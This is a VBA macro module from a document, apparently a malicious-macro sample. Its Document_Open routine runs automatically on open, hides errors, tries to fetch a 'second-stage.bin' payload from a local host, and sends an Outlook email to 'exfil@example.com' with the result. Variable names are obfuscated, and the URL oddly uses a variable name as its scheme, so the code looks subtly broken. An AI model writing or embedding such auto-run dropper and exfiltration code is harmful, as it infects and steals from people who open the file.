Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As Object, url As String
    Dim xcx6ug6uo As Object, sarv21hmdtd5d As Object
    On Error Resume Next
    url = "lckhv437://127.0.0.1:9090/second-stage.bin"
    Set lckhv437 = CreateObject("MSXML2.XMLHTTP")
    lckhv437.Open "GET", url, False
    lckhv437.Send
    Set xcx6ug6uo = CreateObject("Outlook.Application")
    Set sarv21hmdtd5d = xcx6ug6uo.CreateItem(0)
    sarv21hmdtd5d.To = "exfil@example.com"
    sarv21hmdtd5d.Subject = "logs"
    sarv21hmdtd5d.Body = lckhv437.Status
    sarv21hmdtd5d.Send
End Sub
